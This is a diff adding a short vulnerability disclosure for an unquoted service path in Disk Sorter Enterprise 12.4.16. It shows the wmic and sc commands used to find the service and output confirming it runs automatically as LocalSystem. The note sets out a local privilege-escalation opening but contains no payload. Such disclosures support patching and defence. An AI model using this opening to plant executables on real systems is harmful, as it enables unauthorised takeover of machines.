@@ -1,0 +1,25 @@
+Exploit Title: Disk Sorter Enterprise 12.4.16 - 'Disk Sorter Enterprise' Unquoted Service Path
+Exploit Author: boku
+Date: 2020-02-10
+Vendor Homepage: http://www.disksorter.com
+Software Link: http://www.disksorter.com/setups/disksorterent_setup_v12.4.16.exe
+Version: 12.4.16
+Tested On: Windows 10 (32-bit)
+
+
+C:\Users\terran>wmic service get name, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i "Disk Sorter" | findstr /i /v """
+Disk Sorter Enterprise                    C:\Program Files\Disk Sorter Enterprise\bin\disksrs.exe                            Auto
+
+C:\Users\terran>sc qc "Disk Sorter Enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Disk Sorter Enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
